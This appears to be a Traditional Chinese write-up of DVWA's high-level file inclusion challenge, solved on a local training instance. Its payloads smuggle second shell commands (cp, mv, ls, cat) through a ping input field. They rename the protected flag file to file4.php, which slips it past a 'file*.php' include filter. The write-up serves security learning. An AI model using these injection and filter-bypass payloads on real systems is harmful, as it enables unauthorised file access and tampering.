# File Inclusion

> **Objective:** Read all five famous quotes from '[../hackable/flags/fi.php](http://localhost:8086/hackable/flags/fi.php)' using only the file inclusion.
>

> The developer has read up on some of the issues with LFI/RFI, and decided to filter the input. However, the patterns that are used, isn't enough.
>

看提示應該可以猜到有過濾載入的檔案名稱 pattern，跟 medium 時一樣來測試看看將 `../hackable/flags/fi.php` 複製到 `vulnerabilities/fi/` 能不能被讀取

```jsx
[../hackable/flags/fi.php](http://localhost:8086/hackable/flags/fi.php)
```

```jsx
'127.0.0.1'  > ./log.txt || cp ../../hackable/flags/fi.php ../fi/
```

```markdown
'127.0.0.1'  > ./log.txt || ls ../fi/
```

```markdown
fi.php
file1.php
file2.php
file3.php
file4.php
help
include.php
index.php
source
```

無法讀取 QQ， `ERROR: File not found!`

應該是有限定檔案名稱，pattern 應該就是 `file*.php`

```markdown
http://dvwa.localtest/vulnerabilities/fi/?page=fi.php
```

沒關係，那只要將 `fi.php` 改成絕對可以執行的檔案名稱 `file4.php` 就好了，這樣就能夠通過檢查

```jsx
'127.0.0.1'  > ./log.txt || ls ../fi/
```

```markdown
'127.0.0.1'  > ./log.txt || mv ../fi/file4.php ../fi/file4-du.php
```

```markdown
'127.0.0.1'  > ./log.txt || mv ../fi/fi.php ../fi/file4.php
```
現在 `fi.php` 已經偽裝成 `file4.php` 了
```markdown
file1.php
file2.php
file3.php
file4.php
file4du.php
help
include.php
index.php
source
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/d4c6d42e-140c-498b-aba3-99d4f06cbba9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T031450Z&X-Amz-Expires=86400&X-Amz-Signature=16588c96fa7b18053c52ccef53e6f2ae1ac60713196675f723f8b6b038d2f079&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

### Done

唯一可以確定的是 file4.php 是可以載入的，當然你也可以換成 file1~file3.php

```markdown
http://dvwa.localtest/vulnerabilities/fi/?page=file4.php
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/370a7c2d-729c-426b-ba8e-345d7c7670fa/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T031639Z&X-Amz-Expires=86400&X-Amz-Signature=0c565d7467c7ac903ca1de5328c9465ee055e2e31a2e9f9ed81cb829ea139bc8&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

內容一樣沒有變
```markdown
'127.0.0.1'  > ./log.txt || cat ../fi/file4.php
```
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/f1e9c50e-7de9-47ec-a5a9-0809ae67526f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220218%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220218T031703Z&X-Amz-Expires=86400&X-Amz-Signature=89f66184d0033ad4c9460992bc92a2aa2f3bb129428a4f7fe168c5ac0b4e14ff&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

### memo

來驗證 pattern 是否為 `file*.php` ，試試將 `/fi/fi.php` 複製成 `file5.php`

```markdown
'127.0.0.1'  > ./log.txt || cp ../fi/fi.php ../fi/file5.php
```

```markdown
http://dvwa.localtest/vulnerabilities/fi/?page=file5.php
```

```markdown
'127.0.0.1'  > ./log.txt || cp ../fi/fi.php ../fi/filex.php
```

```markdown
http://dvwa.localtest/vulnerabilities/fi/?page=file5.php
```

都能正常 include 😇
